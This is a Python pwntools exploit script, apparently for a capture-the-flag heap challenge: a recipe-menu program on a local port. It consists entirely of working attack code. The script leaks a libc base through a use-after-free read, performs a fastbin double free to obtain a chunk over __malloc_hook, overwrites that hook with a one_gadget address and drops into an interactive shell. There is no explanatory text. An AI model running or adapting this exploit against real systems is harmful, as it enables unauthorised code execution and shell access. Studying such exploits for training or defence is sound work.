from pwn import *

# Tested on Ubuntu 16.04

def menu():
	r.recvuntil("5.- Exit\n")

def create(pos, size):
	menu()
	r.sendline("1")
	r.recvuntil("Enter position of the recipe\n")
	r.sendline(str(pos))
	r.recvuntil("Enter size in kcal.\n")
	r.sendline(str(size))

def ingredients(num, payload):
	menu()
	r.sendline("2")
	r.recvuntil("Enter menu to ingredients\n")
	r.sendline(str(num))	
	r.recvuntil("Enter ingredients\n")
	r.sendline(payload)

def ver(num):
	menu()
	r.sendline("3")
	r.recvuntil("Enter the recipe to see\n")
	r.sendline(str(num))

def delete(num):
	menu()
	r.sendline("4")
	r.recvuntil("Enter the menu to delete\n")
	r.sendline(str(num))

libc = ELF("/lib/x86_64-linux-gnu/libc-2.23.so")

r = remote("localhost", 4444)

create(0, 127)
create(1, 127)

delete(0)
ver(0)
base_libc = u64(r.recv(6).ljust(8, '\0')) - 0x3c4b78
print "[+] base_libc: 0x%x" % base_libc
delete(1)

create(0, 96)
create(1, 96)

delete(0)
delete(1)
delete(0)

hook = base_libc + libc.symbols['__malloc_hook'] - 0x1b - 0x8 # chunk size 0x7f its ok :)
ingredients(0, p64(hook))

create(3, 96)
create(4, 96) # malloc return &__malloc_hook - 0x13

one_gadget = base_libc + 0xf1117
print "[+] one_gadget: 0x%x" % one_gadget

ingredients(4, "A"*0x13 + p64(one_gadget))

create(5, 96)

r.interactive()
